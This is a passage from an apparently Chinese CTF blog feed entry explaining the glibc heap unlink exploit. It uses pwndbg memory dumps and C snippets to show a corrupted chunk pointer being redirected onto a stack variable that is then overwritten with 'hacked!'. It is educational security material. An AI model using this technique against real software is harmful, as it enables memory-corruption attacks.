class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br></pre></td></tr></table></figure></p><p>变为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x7fffffffdd48</span> &lt;=P-&gt;bk-&gt;fd</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x602090</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br></pre></td></tr></table></figure></p><p>也就是说现在chunk1的值变成了0x7fffffffdd48，chunk1[3]实际上就是chunk1。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">45</span>  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line"><span class="number">46</span>  <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; b <span class="number">47</span></span><br><span class="line">Breakpoint <span class="number">3</span> at <span class="number">0x400788</span>: file unlink.c, line <span class="number">47.</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">0x7fffffffdd48</span></span><br><span class="line">ffffdd48</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-155409.png" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>改变chunk1[3]就是改变chunk1,在本例中, chunk1用于指向变量data并且通过改变chunk1从而影响到了该变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1[3] = (unsigned long long)data;</span><br></pre></td></tr></table></figure></p><p>可以看出现在chunk1的值已经变成了data的地址0x7fffffffdd80<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rdx rsp  0x7fffffffdd60 —▸ 0x7fffffffdd80 —▸ 0x7fffffffddb0 ◂— 0x0</span><br></pre></td></tr></table></figure></p><p>改变data的值为Victim’s data<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(data, <span class="string">"Victim's data"</span>);</span><br></pre></td></tr></table></figure></p><p>在内存中查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7fffffffdd80</span><br><span class="line">0x7fffffffdd80:&quot;Victim&apos;s data&quot;</span><br></pre></td></tr></table></figure></p><p>现在的chunk1已经指向data了，通过给chunk1[0]赋值，其实就是给data赋值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1[0] = 0x002164656b636168LL;</span><br></pre></td></tr></table></figure></p><p>查看内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7fffffffdd80</span><br><span class="line">0x7fffffffdd80:&quot;hacked!&quot;</span><br></pre></td></tr></table></figure></p><p>果然已经变了。<br>字符串已经变成了hacked!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">hacked!</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;unlink简介&quot;&gt;&lt;a href=&quot;#unlink简介&quot; class=&quot;headerlink&quot; title=&quot;unlink简介&quot;&gt;&lt;/a&gt;unlink简介&lt;/h2&gt;&lt;p&gt;unlink的目的是把一个双向链表中的空闲块拿出来，如图。&lt;br&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
  </entry>
  
</feed>
